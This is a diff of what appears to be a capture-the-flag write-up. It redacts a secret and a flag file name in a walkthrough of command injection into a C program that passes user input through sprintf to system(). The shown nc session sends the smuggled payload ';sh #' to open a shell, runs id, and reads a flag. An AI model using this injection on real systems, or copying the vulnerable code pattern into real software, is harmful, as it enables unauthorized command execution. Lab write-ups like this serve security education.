@@ -106,7 +106,7 @@
         size_t commandSize = 255;
         char* command = (char*)malloc(commandSize * sizeof(command)); // command is declared here
 
-        sprintf(command, "./debug_console.sh '%s'", input); //
+        sprintf(command, "./debug_console.sh '%s'", input); // e.g: ./debug_console.sh 'id'
 
         system(command); // first-look
     }
@@ -239,12 +239,12 @@
     ➜  attachments nc 10.10.0.5 1337 -vvv
     10.10.0.5: inverse host lookup failed: Unknown host
     (UNKNOWN) [10.10.0.5] 1337 (?) open
-    Secret: S3cr3t_K3y_b51d35_RJ_
+    Secret: [redacted]
     Choose: process,whoami,id
     > ';sh #
     Usage: ./debug_console.sh <process,whoami,id>
     id
     uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
-    cat /flag-JlmvRzaiW0SlEZ5zLGlR****q57aM.txt
+    cat /flag-[redacted].txt
     hackingclub{raffa_moreira_mano_777}
     ```
